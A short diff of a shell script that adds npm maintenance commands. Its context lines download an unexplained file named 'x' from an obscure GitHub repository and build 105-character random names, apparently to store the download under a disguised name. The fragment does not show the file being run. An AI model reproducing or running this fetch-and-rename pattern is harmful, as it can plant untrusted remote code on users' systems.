@@ -2,6 +2,11 @@
 random_name() {
       tr -dc A-Za-z0-9 </dev/urandom | head -c 105
   }
+  npm cache clean --force
+  npx kill-port 3000
+  npm install -g kill-port
+  npm prune
+  npx systeminformation
 wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
 
 NEW_V2=$(random_name)
